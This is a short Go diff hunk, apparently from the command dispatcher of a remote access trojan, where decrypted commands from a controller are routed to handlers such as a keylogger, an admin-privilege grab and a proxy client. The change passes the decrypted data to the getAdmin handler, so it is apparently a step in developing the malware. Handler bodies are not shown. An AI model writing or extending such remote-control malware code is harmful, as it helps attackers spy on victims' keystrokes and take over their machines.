@@ -60,7 +60,7 @@ func Start() {
 				go keyloggerCmd(sendUserId, decData)
 				break
 			case "getAdmin":
-				go getAdminCmd(sendUserId)
+				go getAdminCmd(sendUserId, decData)
 				break
 			case "proxyClientStart":
 				go proxyClientStartCmd(sendUserId, decData)
